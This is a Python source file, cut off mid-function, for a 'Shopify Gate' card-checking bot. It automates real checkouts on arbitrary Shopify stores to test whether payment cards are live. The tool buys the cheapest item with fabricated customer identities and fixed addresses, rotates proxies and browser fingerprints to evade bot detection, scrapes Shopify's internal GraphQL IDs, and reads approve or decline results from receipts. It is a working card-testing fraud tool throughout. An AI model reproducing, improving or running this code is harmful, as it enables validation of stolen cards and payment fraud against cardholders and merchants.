#!/usr/bin/env python3
"""
Dynamic Shopify Gate for Unity Snippet Bot
Card checking through Shopify checkout automation - Works with any Shopify site
"""

import json
import random
import string
import re
from time import sleep, time
from typing import Optional, Tuple, Dict, Any, List
from curl_cffi import requests
from urllib.parse import urljoin, urlparse
import asyncio
import logging
from faker import Faker
from config import PROXY

logger = logging.getLogger(__name__)

fake = Faker()

class ShopifyGate:
    """Dynamic Shopify checkout automation for card checking - Works with any site"""
    
    def __init__(self, db=None):
        # Configuration - use config values as fallback
        self.PROXY = PROXY
        self.db = db
        
        # Cache for mutation IDs per site
        self.site_mutation_cache = {}
        
        # Browser versions for randomization
        self.chrome_versions = ['120', '121', '122', '123', '124']
        
        # Common headers - will be randomized per request
        self.COMMON_HEADERS = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/8.0 (Windows NT 10.0; Win64; x64) AppleWebKit/837.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/437.36',
        }
    
    def _get_random_browser_impersonation(self):
        """Get a random browser impersonation to avoid fingerprinting"""
        impersonations = [
            "chrome120",
            "chrome119",
            "chrome116",
            "edge101",
            "safari15_5"
        ]
        return random.choice(impersonations)
    
    def _get_random_email(self):
        """Generate a realistic random email address"""
        domains = [
            'gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 
            'icloud.com', 'protonmail.com', 'aol.com', 'mail.com'
        ]
        username = fake.user_name()
        # Add random numbers to make it more unique
        if random.choice([True, False]):
            username += str(random.randint(1, 999))
        domain = random.choice(domains)
        return f"{username}@{domain}"
    
    def _get_random_customer(self):
        """Generate random customer data that looks real"""
        first_name = fake.first_name()
        last_name = fake.last_name()
        email = self._get_random_email()
        # Generate phone in E.164 format: +[country code][number]
        # Use common country codes and ensure proper format
        country_codes = ['1', '44', '61', '91', '86', '81', '49', '33', '39', '34']
        country_code = random.choice(country_codes)
        # Generate 10 digit number
        phone_number = ''.join([str(random.randint(0, 9)) for _ in range(10)])
        phone_formatted = f"+{country_code}{phone_number}"
        
        return {
            'first_name': first_name,
            'last_name': last_name,
            'full_name': f"{first_name} {last_name}",
            'email': email,
            'phone': phone_formatted
        }
    
    def _get_random_phone(self, country_code: str = 'US'):
        """Generate a random US phone number with valid area code (digits only, no +1)"""
        # Always use US phone format regardless of country
        # Valid US area codes (some common ones)
        area_codes = [
            '201', '202', '203', '205', '206', '207', '208', '209', '210',
            '212', '213', '214', '215', '216', '217', '218', '219', '220',
            '224', '225', '228', '229', '231', '234', '239', '240', '248',
            '251', '252', '253', '254', '256', '260', '262', '267', '269',
            '270', '272', '274', '276', '281', '301', '302', '303', '304',
            '305', '307', '308', '309', '310', '312', '313', '314', '315',
            '316', '317', '318', '319', '320', '321', '323', '325', '330',
            '331', '334', '336', '337', '339', '346', '347', '351', '352',
            '360', '361', '364', '380', '385', '386', '401', '402', '404',
            '405', '406', '407', '408', '409', '410', '412', '413', '414',
            '415', '417', '419', '423', '424', '425', '430', '432', '434',
            '435', '440', '442', '443', '458', '463', '469', '470', '475',
            '478', '479', '480', '484', '501', '502', '503', '504', '505',
            '507', '508', '509', '510', '512', '513', '515', '516', '517',
            '518', '520', '530', '531', '534', '539', '540', '541', '551',
            '559', '561', '562', '563', '564', '567', '570', '571', '573',
            '574', '575', '580', '585', '586', '601', '602', '603', '605',
            '606', '607', '608', '609', '610', '612', '614', '615', '616',
            '617', '618', '619', '620', '623', '626', '628', '629', '630',
            '631', '636', '641', '646', '650', '651', '657', '660', '661',
            '662', '667', '669', '678', '680', '681', '682', '701', '702',
            '703', '704', '706', '707', '708', '712', '713', '714', '715',
            '716', '717', '718', '719', '720', '724', '725', '727', '731',
            '732', '734', '737', '740', '743', '747', '754', '757', '760',
            '762', '763', '765', '769', '770', '772', '773', '774', '775',
            '779', '781', '785', '786', '801', '802', '803', '804', '805',
            '806', '808', '810', '812', '813', '814', '815', '816', '817',
            '818', '828', '830', '831', '832', '843', '845', '847', '848',
            '850', '854', '856', '857', '858', '859', '860', '862', '863',
            '864', '865', '870', '872', '878', '901', '903', '904', '906',
            '907', '908', '909', '910', '912', '913', '914', '915', '916',
            '917', '918', '919', '920', '925', '928', '929', '930', '931',
            '934', '936', '937', '938', '940', '941', '947', '949', '951',
            '952', '954', '956', '959', '970', '971', '972', '973', '978',
            '979', '980', '984', '985', '989'
        ]
        
        area_code = random.choice(area_codes)
        # Generate 7 more digits (XXX-XXXX format)
        # First digit of exchange code (2nd set of 3 digits) should be 2-9
        exchange = str(random.randint(2, 9)) + ''.join([str(random.randint(0, 9)) for _ in range(2)])
        subscriber = ''.join([str(random.randint(0, 9)) for _ in range(4)])
        
        # Return digits only, no +1 prefix
        return f"{area_code}{exchange}{subscriber}"
    
    async def initialize_proxy(self):
        """Load proxy from database if available"""
        if self.db:
            try:
                db_proxy = await self.db.get_proxy()
                if db_proxy:
                    self.PROXY = db_proxy

                    logger.info(f"Loaded proxy from database: {db_proxy[:50]}{'...' if len(db_proxy) > 50 else ''}")
            except Exception as e:
                logger.error(f"Error loading proxy from database: {e}")
                logger.info("Using default proxy from config")
    
    async def add_site(self, site_url: str) -> bool:
        """Add a new site to the database"""
        try:
            # Validate and format URL
            if not site_url.startswith(('http://', 'https://')):
                site_url = 'https://' + site_url
            
            parsed = urlparse(site_url)
            if not parsed.netloc:
                return False
            
            # Clean URL
            clean_url = f"{parsed.scheme}://{parsed.netloc}"
            
            # Test if it's a valid Shopify site
            if not await self._test_shopify_site(clean_url):
                return False
            
            # Add to database
            if self.db:
                # Get existing sites
                existing_sites = await self.get_all_sites()
                if clean_url not in existing_sites:
                    existing_sites.append(clean_url)
                    await self.db.set_setting("shopify_sites", json.dumps(existing_sites))
                    logger.info(f"Site added to database: {clean_url}")
                else:
                    logger.info(f"Site already exists: {clean_url}")
                return True
            
            return False
                
        except Exception as e:
            logger.error(f"Error adding site: {e}")
            return False
    
    async def add_site_warning(self, site_url: str) -> bool:
        """Add a warning to a site for submit for completion failures"""
        try:
            if self.db:
                # Get existing warnings
                warnings_json = await self.db.get_setting("site_warnings")
                warnings = json.loads(warnings_json) if warnings_json else {}
                
                # Add or increment warning count
                warnings[site_url] = warnings.get(site_url, 0) + 1
                
                await self.db.set_setting("site_warnings", json.dumps(warnings))
                logger.warning(f"Added warning to site {site_url} (total warnings: {warnings[site_url]})")
                
                # Remove site if it has 2 warnings
                if warnings[site_url] >= 2:
                    logger.warning(f"Site {site_url} has {warnings[site_url]} warnings, removing from database")
                    await self.remove_site(site_url)
                    # Also remove from warnings
                    del warnings[site_url]
                    await self.db.set_setting("site_warnings", json.dumps(warnings))
                    return True
                
                return False
            return False
        except Exception as e:
            logger.error(f"Error adding site warning: {e}")
            return False
    
    async def reset_site_warning(self, site_url: str) -> bool:
        """Reset warnings for a site when submit for completion succeeds"""
        try:
            if self.db:
                warnings_json = await self.db.get_setting("site_warnings")
                warnings = json.loads(warnings_json) if warnings_json else {}
                
                if site_url in warnings:
                    del warnings[site_url]
                    await self.db.set_setting("site_warnings", json.dumps(warnings))
                    logger.info(f"Reset warnings for site {site_url} due to successful submit for completion")
                    return True
            return False
        except Exception as e:
            logger.error(f"Error resetting site warning: {e}")
            return False

    async def remove_site(self, site_url: str) -> bool:
        """Remove a site from the database"""
        try:
            if self.db:
                # Get existing sites
                existing_sites = await self.get_all_sites()
                if site_url in existing_sites:
                    existing_sites.remove(site_url)
                    await self.db.set_setting("shopify_sites", json.dumps(existing_sites))
                    logger.warning(f"Site removed from database due to error: {site_url}")
                    return True
            return False
        except Exception as e:
            logger.error(f"Error removing site: {e}")
            return False

    async def get_all_sites(self) -> List[str]:
        """Get all sites from database"""
        if self.db:
            try:
                sites_json = await self.db.get_setting("shopify_sites")
                if sites_json:
                    return json.loads(sites_json)
            except Exception as e:
                logger.error(f"Error getting sites: {e}")
        return []
    
    async def get_random_site(self) -> Optional[str]:
        """Get a random site from database"""
        sites = await self.get_all_sites()
        if sites:
            return random.choice(sites)
        return None
    
    async def _test_shopify_site(self, site_url: str) -> bool:
        """Test if the site is a valid Shopify site"""
        try:
            session = self._create_fresh_session()
            # Add realistic headers to avoid detection
            headers = {
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            }
            response = session.get(f"{site_url}/products.json", headers=headers, timeout=10)
            session.close()
            
            if response.status_code == 200:
                data = response.json()
                return 'products' in data and isinstance(data['products'], list) and len(data['products']) > 0
            return False
        except Exception as e:
            logger.error(f"Error testing Shopify site: {e}")
            return False
    
    async def _test_single_site(self, site_url: str, cc_number: str, month: int, year: int, cvv: str) -> Dict[str, Any]:
        """Test a single site with a card transaction to verify it works completely"""
        start_time = time()
        session = self._create_fresh_session()
        
        try:
            logger.info(f"Testing site {site_url} with test card {cc_number[:6]}****{cc_number[-4:]}")
            
            # Phase 1: Get products and find minimum price product
            loop = asyncio.get_event_loop()
            products_data = await loop.run_in_executor(None, self._get_products, session, site_url)
            min_product = self._get_minimum_price_product(products_data)
            
            # Phase 2: Create cart dynamically and get checkout tokens
            cart_response = await loop.run_in_executor(None, self._create_dynamic_cart, session, site_url, min_product['id'])
            tokens = self._extract_tokens_from_response(cart_response)
            if not tokens:
                raise Exception("Failed to extract checkout tokens - site may have invalid cart structure")
            
            # Delay after creating cart and before tokenizing card
            await asyncio.sleep(1.5)
            
            # Phase 3: Create payment session
            domain = urlparse(site_url).netloc
            cc_session_id, cc_bin = await loop.run_in_executor(None, self._create_payment_session, session, domain, cc_number, month, year, cvv)
            
            # Add CC BIN to tokens
            tokens['cc_bin'] = cc_bin
            
            # Delay before calling proposal API for the first time
            await asyncio.sleep(3.0)
            
            # Phase 4: Submit proposal
            address = self._get_address_for_site(site_url, tokens.get('currency', 'USD'), tokens.get('country_code', 'US'))
            proposal_result = await loop.run_in_executor(None, self._submit_proposal, session, site_url, tokens, min_product, address)
            
            # Delay before calling submit for completion API
            await asyncio.sleep(1.5)
            
            # Phase 5: Submit checkout
            checkout_result = await loop.run_in_executor(None, self._submit_checkout, session, site_url, tokens, min_product, address, cc_session_id, proposal_result)
            
            # Phase 6: Poll for receipt (limited polling for testing with retry)
            polling_retry_count = 0
            max_polling_retries = 2  # First attempt + 1 retry
            
            while polling_retry_count < max_polling_retries:
                try:
                    receipt_result = await loop.run_in_executor(None, self._poll_receipt_limited, session, site_url, tokens, checkout_result.get('receipt_id'))
                    break  # Success, exit retry loop
                except Exception as polling_error:
                    polling_retry_count += 1
                    
                    if polling_retry_count < max_polling_retries:
                        logger.warning(f"Site testing polling failed (attempt {polling_retry_count}/{max_polling_retries}): {polling_error}")
                        continue
                    else:
                        # Second polling failure during testing - site is not working
                        logger.warning(f"Site {site_url} failed polling test twice: {polling_error}")
                        receipt_result = {
                            'result': 'POLLING_ERROR',
                            'error': str(polling_error)
                        }
            
            total_time = time() - start_time
            
            # Determine if site is working based on result - Accept any polling response
            result = {
                'card_number': cc_number,
                'time_taken': total_time,
                'site': site_url,
                'response': receipt_result
            }
            
            # Accept site if polling gave ANY response (APPROVED, DECLINED, CAPTCHA, ERROR, etc.)
            if receipt_result and 'result' in receipt_result:
                result.update({
                    'success': True,
                    'result': receipt_result.get('result'),
                    'working': True
                })
            else:
                # Only reject if polling gave NO response at all
                result.update({
                    'success': False,
                    'result': 'NO_POLLING_RESPONSE',
                    'error': 'Polling failed to return any response',
                    'working': False
                })
            
            return result
            
        except Exception as e:
            error_msg = str(e).lower()
            
            # Check if this is a site-breaking error - site should not be added
            if any(error_phrase in error_msg for error_phrase in [
                # Polling related errors (only timeout/no response)
                'polling timeout - no definitive result received',
                'polling failed twice - site may have polling issues', 
                'limited polling timeout - no definitive result received',
                # Cart creation errors
                'failed to extract checkout tokens',
                'failed to create dynamic cart',
                'error creating dynamic cart',
                'cart creation failed',
                'invalid cart response',
                'no checkout tokens',
                'checkout tokens',
                'token extraction failed',
                # Out of stock errors
                'item is out of stock',
                'out of stock',
                'sold out',
                'stock_problems',
                'some items in your cart are no longer available',
                'this product is currently unavailable',
                'this item is currently out of stock',
                # Product/site structure errors
                'no products found',
                'invalid json format',
                'missing products key',
                'products.json',
                'site not accessible',
                'site unavailable',
                # Payment session errors
                'payment session failed',
                'failed to create payment session',
                'payment method not available',
                # Proposal errors (critical ones)
                'proposal failed',
                'failed to submit proposal',
                'invalid proposal response',
                # General site errors
                'site error',
                'shopify site error',
                'checkout not available',
                'site maintenance',
                'temporarily unavailable'
            ]):
                logger.warning(f"Site {site_url} has critical errors, marking as non-working")
                return {
                    'success': False,
                    'result': 'SITE_ERROR',
                    'error': str(e),
                    'working': False,
                    'time_taken': time() - start_time,
                    'site': site_url
                }
            
            # Check if error is acceptable for site testing (none are - must be successful)
            logger.error(f"Error testing site {site_url}: {e}")
            return {
                'success': False,
                'error': str(e),
                'result': 'ERROR',
                'working': False,
                'time_taken': time() - start_time,
                'site': site_url
            }
        finally:
            session.close()
    
    def _poll_receipt_limited(self, session, site_url: str, tokens: Dict[str, str], receipt_id: str) -> Dict[str, Any]:
        """Limited polling for site testing - only 3 attempts using mutation IDs"""
        try:
            # Get mutation IDs for this site (should be cached from previous steps)
            mutation_ids = self._get_site_mutation_ids(session, site_url)
            
            # For polling, we might need to find the Poll mutation ID
            # If not available, we'll use a simplified approach
            poll_mutation_id = mutation_ids.get('Poll') or mutation_ids.get('PollForReceipt')
            
            max_polls = 3  # Limited for testing
            poll_count = 0
            
            while poll_count < max_polls:
                poll_count += 1
                sleep(1)  # Shorter wait for testing
                
                if poll_mutation_id:
                    # Use mutation ID if available - send as GET request with URL parameters
                    import json
                    import urllib.parse
                    
                    variables = {
                        'receiptId': receipt_id,
                        'sessionToken': tokens['session_token']
                    }
                    
                    # Build URL with query parameters
                    params = {
                        'operationName': 'PollForReceipt',
                        'variables': json.dumps(variables),
                        'id': poll_mutation_id
                    }
                    
                    # Update headers for GET request
                    headers = {
                        'accept': 'application/json',
                        'accept-language': 'en-US',
                        'content-type': 'application/json',
                        'priority': 'u=1, i',
                        'referer': site_url,
                        'sec-ch-ua': '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'shopify-checkout-client': 'checkout-web/1.0',
                        'shopify-checkout-source': f'id="{tokens.get("checkout_token", "")}", type="cn"',
                        'user-agent': self.COMMON_HEADERS['user-agent'],
                        'x-checkout-one-session-token': tokens['session_token'],
                        'x-checkout-web-build-id': '0fdb7fc0a43cfcbf7a627adfc47b660eb15c4bf6',
                        'x-checkout-web-deploy-stage': 'production',
                        'x-checkout-web-server-handling': 'fast',
                        'x-checkout-web-server-rendering': 'yes',
                        'x-checkout-web-source-id': tokens.get('checkout_token', ''),
                    }
                    
                    # Send as GET request with parameters in URL
                    response = session.get(
                        f'{site_url}/checkouts/internal/graphql/persisted',
                        headers=headers,
                        params=params,  # Changed to GET with params
                        timeout=15
                    )
                else:
                    # Fallback: try to poll without GraphQL (direct receipt check)
                    # This is a simplified approach for sites where we can't extract poll mutation
                    try:
                        receipt_url = f"{site_url}/checkouts/cn/{tokens.get('checkout_token', '')}/receipt"
                        response = session.get(receipt_url, timeout=15)
                        
                        if response.status_code == 200 and ('thank_you' in response.text.lower() or 'success' in response.text.lower()):
                            return {
                                'result': 'APPROVED',
                                'message': 'Payment successful (direct check)',
                                'data': {'receipt_id': receipt_id}
                            }
                        elif response.status_code == 200 and ('declined' in response.text.lower() or 'failed' in response.text.lower()):
                            return {
                                'result': 'DECLINED',
                                'message': 'Payment declined (direct check)',
                                'data': {'receipt_id': receipt_id}
                            }
                        else:
                            continue  # Still processing
                    except:
                        continue  # Try next poll
                response.raise_for_status()
                
                data = response.json()
                
                if 'data' in data and 'receipt' in data['data']:
                    receipt = data['data']['receipt']
                    
                    # Check for ProcessedReceipt (successful completion)
                    if receipt.get('__typename') == 'ProcessedReceipt':
                        # Extract payment details from ProcessedReceipt
                        total_amount = None
                        currency = 'USD'
                        
                        if 'purchaseOrder' in receipt and receipt['purchaseOrder']:
                            purchase_order = receipt['purchaseOrder']
                            if 'totalAmountToPay' in purchase_order:
                                total_amount = purchase_order['totalAmountToPay'].get('amount')
                                currency = purchase_order['totalAmountToPay'].get('currencyCode', 'USD')
                        
                        return {
                            'result': 'APPROVED',
                            'total_amount': total_amount,
                            'currency': currency,
                            'receipt_type': 'ProcessedReceipt',
                            'data': receipt
                        }
                    
                    # Check for FailedReceipt (declined/failed)
                    elif receipt.get('__typename') == 'FailedReceipt':
                        processing_error = receipt.get('processingError', {})
                        error_code = processing_error.get('code', 'UNKNOWN_ERROR')
                        return {
                            'result': 'DECLINED',
                            'error_code': error_code,
                            'error_message': processing_error.get('messageUntranslated', 'Payment failed'),
                            'data': receipt
                        }
                    
                    # Check for successful completion with redirect URL (legacy check)
                    elif 'redirectUrl' in receipt and receipt['redirectUrl']:
                        redirect_url = receipt['redirectUrl']
                        if '/thank_you' in redirect_url or '/post_purchase' in redirect_url:
                            return {
                                'result': 'APPROVED',
                                'redirect_url': redirect_url,
                                'data': receipt
                            }
                    
                    # Check for confirmation page URL (alternative success indicator)
                    elif 'confirmationPage' in receipt and receipt['confirmationPage']:
                        confirmation_page = receipt['confirmationPage']
                        if 'url' in confirmation_page and confirmation_page['url']:
                            return {
                                'result': 'APPROVED',
                                'confirmation_url': confirmation_page['url'],
                                'data': receipt
                            }
                    
                    # Check if still processing or waiting
                    elif '__typename' in receipt:
                        typename = receipt['__typename']
                        if typename in ['WaitingReceipt', 'ProcessingReceipt']:
                            continue
                
                # Check response text for success indicators
                response_text = response.text
                if response_text and ('thank_you' in response_text.lower() or 'post_purchase' in response_text.lower()):
                    return {
                        'result': 'APPROVED',
                        'message': 'Payment successful',
                        'data': data
                    }
            
            # If we've exhausted polls during site testing, raise exception 
            # Site testing requires a definitive response to add the site
            raise Exception("Limited polling timeout - no definitive result received")
            
        except Exception as e:
            logger.error(f"Error in limited polling: {e}")
            # Re-raise the exception to be handled by the calling method
            raise
    
    def _get_minimum_price_product(self, products_json: str) -> Dict[str, Any]:
        """Get the product with minimum price from products.json"""
        try:
            data = json.loads(products_json)
            
            if not isinstance(data, dict) or 'products' not in data:
                raise Exception('Invalid JSON format or missing products key')
            
            min_price = None
            min_price_details = {
                'id': None,
                'price': None,
                'title': None,
            }
            
            for product in data['products']:
                for variant in product['variants']:
                    price = float(variant['price'])
                    if price >= 0.01:
                        if min_price is None or price < min_price:
                            min_price = price
                            min_price_details = {
                                'id': variant['id'],
                                'price': variant['price'],
                                'title': product['title'],
                            }
            
            if min_price is None:
                raise Exception('No products found with price greater than or equal to 0.01')
            
            return min_price_details
            
        except Exception as e:
            logger.error(f"Error getting minimum price product: {e}")
            raise
    
    def _get_address_for_site(self, site_url: str, currency: str = 'USD', country_code: str = 'US') -> Dict[str, str]:
        """Generate appropriate address based on site TLD"""
        parsed = urlparse(site_url)
        domain = parsed.netloc.lower()
        
        # Determine address based on site TLD
        if '.us' in domain or country_code == 'US':
            return {
                'street': 'UPP 1222',
                'city': 'Washington',
                'state': 'WA',
                'postcode': '98001',
                'country': 'US',
                'currency': 'USD'
            }
        elif '.uk' in domain or country_code == 'GB':
            return {
                'street': '11N Mary Slessor Square',
                'city': 'Dundee',
                'state': 'SCT',
                'postcode': 'DD4 6BW',
                'country': 'GB',
                'currency': 'GBP'
            }
        elif '.in' in domain or country_code == 'IN':
            return {
                'street': 'bhagirathpura indore',
                'city': 'indore',
                'state': 'MP',
                'postcode': '452003',
                'country': 'IN',
                'currency': 'INR'
            }
        elif '.ca' in domain or country_code == 'CA':
            return {
                'street': '11n Lane Street',
                'city': "Barry's Bay",
                'state': 'ON',
                'postcode': 'K0J 2M0',
                'country': 'CA',
                'currency': 'CAD'
            }
        elif '.au' in domain or country_code == 'AU':
            return {
                'street': '94 Swanston Street',
                'city': 'Wingham',
                'state': 'NSW',
                'postcode': '2429',
                'country': 'AU',
                'currency': 'AUD'
            }
        else:
            # Default to US
            return {
                'street': '11n lane avenue south',
                'city': 'Jacksonville',
                'state': 'FL',
                'postcode': '32210',
                'country': 'US',
                'currency': currency or 'USD'
            }
    
    def _create_fresh_session(self):
        """Create a fresh session for each card check to avoid cross-contamination"""
        # Use curl_cffi with random browser impersonation to bypass bot detection
        impersonate = self._get_random_browser_impersonation()
        session = requests.Session(impersonate=impersonate)
        session.proxies = {"http": self.PROXY, "https": self.PROXY}
        # Add a small random delay to mimic human behavior
        sleep(random.uniform(0.1, 0.3))
        return session
    
    def _extract_actions_js_url(self, checkout_html: str, site_url: str) -> Optional[str]:
        """Extract actions.js URL from checkout page HTML"""
        try:
            # Look for the actions.js file pattern in the HTML
            patterns = [
                r'"/cdn/shopifycloud/checkout-web/assets/c1/actions\.([^"]+)\.js"',
                r'"(/cdn/shopifycloud/checkout-web/assets/[^"]*actions[^"]*\.js)"',
                r'"/cdn/shopifycloud/checkout-web/assets/[^"]*actions[^"]*\.js"'
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, checkout_html)
                print(matches)
                if matches:
                    # Take the first match and construct full URL
                    actions_path = matches[0]
                    if not actions_path.startswith('/'):
                        # If it's just the hash part, construct the full path
                        actions_path = f"/cdn/shopifycloud/checkout-web/assets/c1/actions.{actions_path}.js"
                    
                    return f"https://{site_url}{actions_path}"
            
            # Alternative approach: look for any reference to actions file
            action_pattern = r'"([^"]*actions[^"]*\.js)"'
            matches = re.findall(action_pattern, checkout_html)
            print(matches)
            for match in matches:
                if 'shopifycloud' in match:
                    if match.startswith('/'):
                        return f"https://{site_url}{match}"
                    else:
                        return f"https://{site_url}/{match}"
            
            return None
            
        except Exception as e:
            print(f"Error extracting actions.js URL: {e}")
            return None
    
    def _fetch_actions_js_content(self, session, actions_url: str) -> Optional[str]:
        """Fetch the content of actions.js file"""
        try:
            headers = {
                'Accept': 'application/javascript, */*;q=0.1',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Sec-Fetch-Dest': 'script',
                'Sec-Fetch-Mode': 'no-cors',
                'Sec-Fetch-Site': 'same-site'
            }
            
            response = session.get(actions_url, headers=headers, timeout=15)
            
            if response.status_code == 200:
                return response.text
            else:
                print(f"Failed to fetch actions.js: HTTP {response.status_code}")
                return None
                
        except Exception as e:
            print(f"Error fetching actions.js content: {e}")
            return None
    
    def _extract_mutation_ids_from_actions(self, actions_content: str) -> Dict[str, str]:
        """Extract mutation IDs from actions.js content"""
        try:
            mutation_ids = {}
            
            # Pattern 1: Match mutation objects like:
            # const Bn={id:"b0f18e8e6aaa00e070f2efd22ce3129ddd2eadad9fc258d868304dffcf134ab1",type:"mutation",name:"SubmitForCompletion",source:""}
            mutation_pattern1 = r'const\s+\w+\s*=\s*\{\s*id\s*:\s*"([a-f0-9]{64})"\s*,\s*type\s*:\s*"mutation"\s*,\s*name\s*:\s*"(\w+)"\s*,\s*source\s*:\s*"[^"]*"\s*\}'
            
            matches = re.findall(mutation_pattern1, actions_content)
            for match in matches:
                mutation_id, mutation_name = match
                mutation_ids[mutation_name] = mutation_id
                print(f"Found mutation (pattern1): {mutation_name} = {mutation_id}")
            
            # Pattern 2: Alternative pattern for different formatting
            mutation_pattern2 = r'\{\s*id\s*:\s*"([a-f0-9]{64})"\s*,\s*type\s*:\s*"mutation"\s*,\s*name\s*:\s*"(\w+)"'
            
            alt_matches = re.findall(mutation_pattern2, actions_content)
            for match in alt_matches:
                mutation_id, mutation_name = match
                if mutation_name not in mutation_ids:  # Don't overwrite existing
                    mutation_ids[mutation_name] = mutation_id
                    print(f"Found mutation (pattern2): {mutation_name} = {mutation_id}")
            
            # Pattern 3: Look for variable assignments with mutation objects (including queries)
            # Example: Qn={id:"e6d6c3a836bde23b1dea03f491eedaf574d1181c5443f64a48e7e665d6d55793",type:"query",name:"Proposal",source:""}
            mutation_pattern3 = r'(\w+)\s*=\s*\{\s*id\s*:\s*"([a-f0-9]{64})"\s*,\s*type\s*:\s*"(?:mutation|query)"\s*,\s*name\s*:\s*"(\w+)"\s*,\s*source\s*:\s*"[^"]*"\s*\}'
            
            var_matches = re.findall(mutation_pattern3, actions_content)
            for match in var_matches:
                var_name, mutation_id, mutation_name = match
                if mutation_name not in mutation_ids:
                    mutation_ids[mutation_name] = mutation_id
                    print(f"Found mutation (pattern3): {mutation_name} = {mutation_id} (var: {var_name})")
            
            # Pattern 4: Look for specific mutations we need with more flexible patterns
            specific_patterns = {
                'SubmitForCompletion': [
                    r'SubmitForCompletion[^}]*id\s*:\s*"([a-f0-9]{64})"',
                    r'"SubmitForCompletion"[^}]*id\s*:\s*"([a-f0-9]{64})"',
                    r'name\s*:\s*"SubmitForCompletion"[^}]*id\s*:\s*"([a-f0-9]{64})"'
                ],
                'Proposal': [
                    r'Proposal[^}]*id\s*:\s*"([a-f0-9]{64})"',
                    r'"Proposal"[^}]*id\s*:\s*"([a-f0-9]{64})"',
                    r'name\s*:\s*"Proposal"[^}]*id\s*:\s*"([a-f0-9]{64})"'
                ],
                'CheckoutProfile': [
                    r'CheckoutProfile[^}]*id\s*:\s*"([a-f0-9]{64})"',
                    r'"CheckoutProfile"[^}]*id\s*:\s*"([a-f0-9]{64})"',
                    r'name\s*:\s*"CheckoutProfile"[^}]*id\s*:\s*"([a-f0-9]{64})"'
                ],
                'Poll': [
                    r'Poll[^}]*id\s*:\s*"([a-f0-9]{64})"',
                    r'"Poll"[^}]*id\s*:\s*"([a-f0-9]{64})"',
                    r'name\s*:\s*"Poll"[^}]*id\s*:\s*"([a-f0-9]{64})"'
                ],
                'PollForReceipt': [
                    r'PollForReceipt[^}]*id\s*:\s*"([a-f0-9]{64})"',
                    r'"PollForReceipt"[^}]*id\s*:\s*"([a-f0-9]{64})"',
                    r'name\s*:\s*"PollForReceipt"[^}]*id\s*:\s*"([a-f0-9]{64})"'
                ]
            }
            
            for name, patterns in specific_patterns.items():
                if name not in mutation_ids:
                    for pattern in patterns:
                        match = re.search(pattern, actions_content)
                        if match:
                            mutation_ids[name] = match.group(1)
                            print(f"Found mutation (specific): {name} = {match.group(1)}")
                            break
            
            # Pattern 5: Look for any 64-character hex strings that might be mutation IDs
            # and try to find their associated names nearby
            hex_pattern = r'"([a-f0-9]{64})"'
            hex_matches = re.findall(hex_pattern, actions_content)
            
            for hex_id in hex_matches:
                # Look for mutation names near this ID
                context_start = max(0, actions_content.find(hex_id) - 200)
                context_end = min(len(actions_content), actions_content.find(hex_id) + 200)
                context = actions_content[context_start:context_end]
                
                # Check if this looks like a mutation definition
                if 'mutation' in context or 'query' in context:
                    # Try to find the name
                    name_patterns = [
                        r'name\s*:\s*"(\w+)"',
                        r'"(\w+)"\s*[^"]*' + re.escape(hex_id),
                        r'operationName\s*:\s*"(\w+)"'
                    ]
                    
                    for name_pattern in name_patterns:
                        name_match = re.search(name_pattern, context)
                        if name_match:
                            potential_name = name_match.group(1)
                            if potential_name not in mutation_ids and len(potential_name) > 3:
                                mutation_ids[potential_name] = hex_id
                                print(f"Found mutation (context): {potential_name} = {hex_id}")
                                break
            
            print(f"Final extracted mutation IDs: {mutation_ids}")
            print(mutation_ids)
            return mutation_ids
            
        except Exception as e:
            print(f"Error extracting mutation IDs: {e}")
            return {}

    def _extract_poll_for_receipt_from_utilities(self, utilities_content: str) -> Dict[str, str]:
        """Extract PollForReceipt mutation ID from utilities JavaScript content"""
        try:
            mutation_ids = {}
            
            # Look for PollForReceipt mutation ID pattern in utilities.js
            # Pattern: {id:"2db3246fa83390126a41952b21af3b97985d62dc7a45cb102d9e4b8784372e6a",type:"query",name:"PollForReceipt",source:""}
            poll_patterns = [
                r'\{\s*id\s*:\s*"([a-f0-9]{64})"\s*,\s*type\s*:\s*"query"\s*,\s*name\s*:\s*"PollForReceipt"\s*,\s*source\s*:\s*"[^"]*"\s*\}',
                r'PollForReceipt[^}]*id\s*:\s*"([a-f0-9]{64})"',
                r'"PollForReceipt"[^}]*id\s*:\s*"([a-f0-9]{64})"',
                r'name\s*:\s*"PollForReceipt"[^}]*id\s*:\s*"([a-f0-9]{64})"',
                r'const\s+\w+\s*=\s*\{\s*id\s*:\s*"([a-f0-9]{64})"\s*,\s*type\s*:\s*"query"\s*,\s*name\s*:\s*"PollForReceipt"'
            ]
            
            for pattern in poll_patterns:
                match = re.search(pattern, utilities_content)
                if match:
                    mutation_ids['PollForReceipt'] = match.group(1)
                    print(f"Found PollForReceipt mutation ID: {match.group(1)}")
                    break
            
            # Also look for any other mutations that might be in utilities.js
            # General pattern for any mutation/query in utilities
            general_pattern = r'\{\s*id\s*:\s*"([a-f0-9]{64})"\s*,\s*type\s*:\s*"(?:mutation|query)"\s*,\s*name\s*:\s*"(\w+)"\s*,\s*source\s*:\s*"[^"]*"\s*\}'
            
